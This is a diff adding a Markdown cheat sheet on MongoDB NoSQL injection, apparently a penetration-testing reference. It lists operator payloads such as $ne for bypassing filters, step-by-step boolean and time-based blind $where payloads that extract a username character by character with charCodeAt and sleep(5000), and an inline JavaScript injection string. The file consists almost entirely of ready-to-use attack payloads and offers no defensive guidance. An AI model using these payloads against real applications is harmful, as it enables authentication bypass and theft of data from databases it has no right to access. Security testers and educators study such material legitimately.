@@ -1,0 +1,392 @@
+# MongoDB
+
+MongoDB uses NoSQL queries, so injection involves manipulating JSON-like structures or JavaScript to extract data, often for authentication bypass or data leakage.
+
+## Operator-based (similar to union)
+Use operators like $ne to match all documents or bypass filters, allowing retrieval of basic info like if a user exists.
+
+To match all documents (retrieve all, similar to dumping basic info):
+In parameter: {"username": {"$ne": null}}
+
+To check for specific user 'admin':
+In parameter: {"username": "admin"}
+
+## Boolean-based blind
+Inject JavaScript conditions via $where to test true/false based on document properties, inferring from response (e.g., login success or document returned).
+
+To find length of username field (assume 'admin' length 5, binary search via app response):
+
+Check if this.username.length >16:
+{"$where": "this.username.length >16"}
+
+(Assume false)
+
+>8:
+{"$where": "this.username.length >8"}
+
+(False)
+
+>4:
+{"$where": "this.username.length >4"}
+
+(True)
+
+>6:
+{"$where": "this.username.length >6"}
+
+(False)
+
+>5:
+{"$where": "this.username.length >5"}
+
+(False)
+
+=5:
+{"$where": "this.username.length ==5"}
+
+(True)
+
+To extract characters (using charCodeAt for ASCII):
+
+Position 0 (Mongo indexing, 'a'=97):
+
+this.username.charCodeAt(0) >109:
+{"$where": "this.username.charCodeAt(0) >109"}
+
+(False)
+
+>103:
+{"$where": "this.username.charCodeAt(0) >103"}
+
+(False)
+
+>100:
+{"$where": "this.username.charCodeAt(0) >100"}
+
+(False)
+
+>98:
+{"$where": "this.username.charCodeAt(0) >98"}
+
+(False)
+
+>97:
+{"$where": "this.username.charCodeAt(0) >97"}
+
+(False)
+
+==97:
+{"$where": "this.username.charCodeAt(0) ==97"}
+
+(True)
+
+Position 1 ('d'=100):
+
+>109:
+{"$where": "this.username.charCodeAt(1) >109"}
+
+(False)
+
+>103:
+{"$where": "this.username.charCodeAt(1) >103"}
+
+(False)
+
+>100:
+{"$where": "this.username.charCodeAt(1) >100"}
+
+(False)
+
+>98:
+{"$where": "this.username.charCodeAt(1) >98"}
+
+(True)
+
+>99:
+{"$where": "this.username.charCodeAt(1) >99"}
+
+(True)
+
+==100:
+{"$where": "this.username.charCodeAt(1) ==100"}
+
+(True)
+
+Position 2 ('m'=109):
+
+>109:
+{"$where": "this.username.charCodeAt(2) >109"}
+
+(False)
+
+>103:
+{"$where": "this.username.charCodeAt(2) >103"}
+
+(True)
+
+>106:
+{"$where": "this.username.charCodeAt(2) >106"}
+
+(True)
+
+>108:
+{"$where": "this.username.charCodeAt(2) >108"}
+
+(True)
+
+>109:
+{"$where": "this.username.charCodeAt(2) >109"}
+
+(False)
+
+==109:
+{"$where": "this.username.charCodeAt(2) ==109"}
+
+(True)
+
+Position 3 ('i'=105):
+
+>109:
+{"$where": "this.username.charCodeAt(3) >109"}
+
+(False)
+
+>103:
+{"$where": "this.username.charCodeAt(3) >103"}
+
+(True)
+
+>106:
+{"$where": "this.username.charCodeAt(3) >106"}
+
+(False)
+
+>104:
+{"$where": "this.username.charCodeAt(3) >104"}
+
+(True)
+
+>105:
+{"$where": "this.username.charCodeAt(3) >105"}
+
+(False)
+
+==105:
+{"$where": "this.username.charCodeAt(3) ==105"}
+
+(True)
+
+Position 4 ('n'=110):
+
+>109:
+{"$where": "this.username.charCodeAt(4) >109"}
+
+(True)
+
+>116:
+{"$where": "this.username.charCodeAt(4) >116"}
+
+(False)
+
+>113:
+{"$where": "this.username.charCodeAt(4) >113"}
+
+(False)
+
+>111:
+{"$where": "this.username.charCodeAt(4) >111"}
+
+(False)
+
+>110:
+{"$where": "this.username.charCodeAt(4) >110"}
+
+(False)
+
+==110:
+{"$where": "this.username.charCodeAt(4) ==110"}
+
+(True)
+
+## Time-based blind
+If JavaScript is enabled, use sleep() in $where to delay response if condition true.
+
+Base delay:
+{"$where": "sleep(5000)"}
+
+To find length:
+
+if(this.username.length >16) sleep(5000)
+{"$where": "if(this.username.length >16) sleep(5000)"}
+
+(No delay)
+
+>8:
+{"$where": "if(this.username.length >8) sleep(5000)"}
+
+(No delay)
+
+>4:
+{"$where": "if(this.username.length >4) sleep(5000)"}
+
+(Delay)
+
+>6:
+{"$where": "if(this.username.length >6) sleep(5000)"}
+
+(No delay)
+
+>5:
+{"$where": "if(this.username.length >5) sleep(5000)"}
+
+(No delay)
+
+==5:
+{"$where": "if(this.username.length ==5) sleep(5000)"}
+
+(Delay)
+
+To extract:
+
+Position 0:
+
+if(this.username.charCodeAt(0) >109) sleep(5000)
+{"$where": "if(this.username.charCodeAt(0) >109) sleep(5000)"}
+
+(No delay)
+
+>103:
+{"$where": "if(this.username.charCodeAt(0) >103) sleep(5000)"}
+
+(No delay)
+
+>100:
+{"$where": "if(this.username.charCodeAt(0) >100) sleep(5000)"}
+
+(No delay)
+
+>98:
+{"$where": "if(this.username.charCodeAt(0) >98) sleep(5000)"}
+
+(No delay)
+
+>97:
+{"$where": "if(this.username.charCodeAt(0) >97) sleep(5000)"}
+
+(No delay)
+
+==97:
+{"$where": "if(this.username.charCodeAt(0) ==97) sleep(5000)"}
+
+(Delay)
+
+Position 1:
+
+{"$where": "if(this.username.charCodeAt(1) >109) sleep(5000)"}
+
+(No delay)
+
+{"$where": "if(this.username.charCodeAt(1) >103) sleep(5000)"}
+
+(No delay)
+
+{"$where": "if(this.username.charCodeAt(1) >100) sleep(5000)"}
+
+(No delay)
+
+{"$where": "if(this.username.charCodeAt(1) >98) sleep(5000)"}
+
+(Delay)
+
+{"$where": "if(this.username.charCodeAt(1) >99) sleep(5000)"}
+
+(Delay)
+
+{"$where": "if(this.username.charCodeAt(1) ==100) sleep(5000)"}
+
+(Delay)
+
+Position 2:
+
+{"$where": "if(this.username.charCodeAt(2) >109) sleep(5000)"}
+
+(No delay)
+
+{"$where": "if(this.username.charCodeAt(2) >103) sleep(5000)"}
+
+(Delay)
+
+{"$where": "if(this.username.charCodeAt(2) >106) sleep(5000)"}
+
+(Delay)
+
+{"$where": "if(this.username.charCodeAt(2) >108) sleep(5000)"}
+
+(Delay)
+
+{"$where": "if(this.username.charCodeAt(2) >109) sleep(5000)"}
+
+(No delay)
+
+{"$where": "if(this.username.charCodeAt(2) ==109) sleep(5000)"}
+
+(Delay)
+
+Position 3:
+
+{"$where": "if(this.username.charCodeAt(3) >109) sleep(5000)"}
+
+(No delay)
+
+{"$where": "if(this.username.charCodeAt(3) >103) sleep(5000)"}
+
+(Delay)
+
+{"$where": "if(this.username.charCodeAt(3) >106) sleep(5000)"}
+
+(No delay)
+
+{"$where": "if(this.username.charCodeAt(3) >104) sleep(5000)"}
+
+(Delay)
+
+{"$where": "if(this.username.charCodeAt(3) >105) sleep(5000)"}
+
+(No delay)
+
+{"$where": "if(this.username.charCodeAt(3) ==105) sleep(5000)"}
+
+(Delay)
+
+Position 4:
+
+{"$where": "if(this.username.charCodeAt(4) >109) sleep(5000)"}
+
+(Delay)
+
+{"$where": "if(this.username.charCodeAt(4) >116) sleep(5000)"}
+
+(No delay)
+
+{"$where": "if(this.username.charCodeAt(4) >113) sleep(5000)"}
+
+(No delay)
+
+{"$where": "if(this.username.charCodeAt(4) >111) sleep(5000)"}
+
+(No delay)
+
+{"$where": "if(this.username.charCodeAt(4) >110) sleep(5000)"}
+
+(No delay)
+
+{"$where": "if(this.username.charCodeAt(4) ==110) sleep(5000)"}
+
+(Delay)
+
+## Inline queries
+Inject JavaScript code to evaluate expressions inline, such as checking or returning data.
+
+To check if username is 'admin':
+'; return this.username == 'admin'; '
+
